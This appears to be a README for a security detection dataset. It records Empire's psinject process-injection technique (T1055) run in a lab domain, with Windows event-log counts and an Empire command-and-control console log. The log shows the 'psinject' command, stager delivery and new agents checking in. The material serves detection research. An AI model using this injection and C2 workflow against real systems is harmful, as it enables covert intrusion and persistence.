
# Empire Psinject

An adversary can use Empire psinject to inject Unmanaged PowerShell into any process. This project is a reflective DLL based on Stephen Fewer's method. It imports/runs a .NET assembly into its memory space that supports the running of Powershell code using System.Management.Automation.

## Technique(s) ID

T1055

## Creators

Roberto Rodriguez [@Cyb3rWard0g](https://twitter.com/Cyb3rWard0g)

## Dataset

[empire_psinject.tar.gz](./empire_psinject.tar.gz)

## Network Environment

Shire

## Time Taken

2019-03-19151711

## About this file

| log_name                                 | task                                                   |   events_count  |
|------------------------------------------|--------------------------------------------------------|-----------------|
| Windows PowerShell                       | Pipeline Execution Details                             |            2166 |
| Windows PowerShell                       | Provider Lifecycle                                     |              16 |
| Windows PowerShell                       | Engine Lifecycle                                       |               2 |
| Security                                 | Filtering Platform Connection                          |             240 |
| Security                                 | Token Right Adjusted Events                            |             179 |
| Security                                 | User Account Management                                |             149 |
| Security                                 | Group Membership                                       |               8 |
| Security                                 | Logon                                                  |               8 |
| Security                                 | Logoff                                                 |               7 |
| Security                                 | Special Logon                                          |               6 |
| Security                                 | File Share                                             |               2 |
| Security                                 | Detailed File Share                                    |               1 |
| Security                                 | Other Object Access Events                             |               1 |
| Security                                 | Process Termination                                    |               1 |
| Security                                 | Sensitive Privilege Use                                |               1 |
| Microsoft-Windows-Sysmon/Operational     | Image loaded (rule: ImageLoad)                         |             293 |
| Microsoft-Windows-Sysmon/Operational     | Process accessed (rule: ProcessAccess)                 |             225 |
| Microsoft-Windows-Sysmon/Operational     | Registry object added or deleted (rule: RegistryEvent) |             217 |
| Microsoft-Windows-Sysmon/Operational     | CreateRemoteThread detected (rule: CreateRemoteThread) |              88 |
| Microsoft-Windows-Sysmon/Operational     | Network connection detected (rule: NetworkConnect)     |              88 |
| Microsoft-Windows-Sysmon/Operational     | File created (rule: FileCreate)                        |              28 |
| Microsoft-Windows-Sysmon/Operational     | Pipe Connected (rule: PipeEvent)                       |              23 |
| Microsoft-Windows-Sysmon/Operational     | Registry value set (rule: RegistryEvent)               |              17 |
| Microsoft-Windows-Sysmon/Operational     | RawAccessRead detected (rule: RawAccessRead)           |               4 |
| Microsoft-Windows-Sysmon/Operational     | Pipe Created (rule: PipeEvent)                         |               1 |
| Microsoft-Windows-Sysmon/Operational     | Process Create (rule: ProcessCreate)                   |               1 |
| Microsoft-Windows-PowerShell/Operational | Executing Pipeline                                     |            2115 |
| Microsoft-Windows-PowerShell/Operational | Execute a Remote Command                               |               1 |
| Microsoft-Windows-PowerShell/Operational | PowerShell Named Pipe IPC                              |               1 |
| Microsoft-Windows-PowerShell/Operational | Starting Command                                       |               1 |

## Empire Activity

```
psinject https 8148
```

```
[*] Tasked G6BYHU4F to run TASK_CMD_JOB
[*] Agent G6BYHU4F tasked with task ID 6
[*] Tasked agent G6BYHU4F to run module powershell/management/psinject
(Empire: G6BYHU4F) > Job started: 2AZBLF
[*] Sending POWERSHELL stager (stage 1) to 10.0.10.104
[*] New agent MPB3UHD1 checked in
[+] Initial agent MPB3UHD1 from 10.0.10.104 now active (Slack)
[*] Sending agent (stage 2) to MPB3UHD1 at 10.0.10.104

(Empire: G6BYHU4F) > 
(Empire: G6BYHU4F) > 
(Empire: G6BYHU4F) > agents

[*] Active agents:

 Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
 ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
 2MES3XN6 ps 172.18.39.105   IT001             SHIRE\pgustavo          powershell         4312   5/0.0    2019-03-19 14:11:49  https           
 G6BYHU4F ps 172.18.39.105   IT001             *SHIRE\pgustavo         powershell         9156   5/0.0    2019-03-19 14:11:50  https           
 MPB3UHD1 ps 172.18.39.105   IT001             *SHIRE\pgustavo         cmd                8148   5/0.0    2019-03-19 14:11:47  https           


(Empire: agents) >
```